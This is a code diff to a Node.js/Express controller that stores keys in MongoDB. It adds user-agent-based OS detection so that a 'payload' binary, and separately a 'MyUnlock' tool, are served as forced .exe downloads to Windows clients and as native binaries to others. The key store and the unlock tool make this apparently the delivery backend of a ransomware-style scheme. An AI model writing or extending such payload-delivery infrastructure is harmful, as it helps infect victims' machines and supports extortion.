@@ -1,5 +1,7 @@
 'use strict';
 var path = require('path');
+var fs = require('fs');
+var useragent = require('express-useragent');
 var mongoose = require('mongoose'),
   Key = mongoose.model('Keys');
 
@@ -88,10 +90,42 @@ exports.delete_a_key = function(req, res) {
 };
 
 exports.get_payload = function(req, res) {
-    res.sendFile(path.join(__dirname + '../../payload/payload'));
+    var headers = req.headers;
+    var source = headers['user-agent'];
+    var ua = useragent.parse(source);
+    var os = ua['os'];
+    console.log("Sending payload");
+    console.log(os);
+    if (os.includes("Windows")) {
+        console.log("Detected Windows OS");
+        var filePath = path.join(__dirname + '../../payload/payload.exe'); 
+        res.setHeader('Content-disposition', 'attachment; filename=payload.exe');
+        res.setHeader('Content-type', 'application/x-msdownload');
+        var file = fs.createReadStream(filePath);
+        file.pipe(res);
+    } else {
+        console.log("Detected Darwin/Linux OS");
+        res.sendFile(path.join(__dirname + '../../payload/payload'));
+    }
 }
 
 exports.get_unlock = function(req, res) {
-    res.sendFile(path.join(__dirname + '../../MyUnlock/MyUnlock'));
+    var headers = req.headers;
+    var source = headers['user-agent'];
+    var ua = useragent.parse(source);
+    var os = ua['os'];
+    console.log("Sending MyUnlock");
+    console.log(os);
+    if (os.includes("Windows")) {
+        console.log("Detected Windows OS");
+        var filePath = path.join(__dirname + '../../MyUnlock/MyUnlock.exe'); 
+        res.setHeader('Content-disposition', 'attachment; filename=MyUnlock.exe');
+        res.setHeader('Content-type', 'application/x-msdownload');
+        var file = fs.createReadStream(filePath);
+        file.pipe(res);
+    } else {
+        console.log("Detected Darwin/Linux OS");
+        res.sendFile(path.join(__dirname + '../../MyUnlock/MyUnlock'));
+    }
 }
 
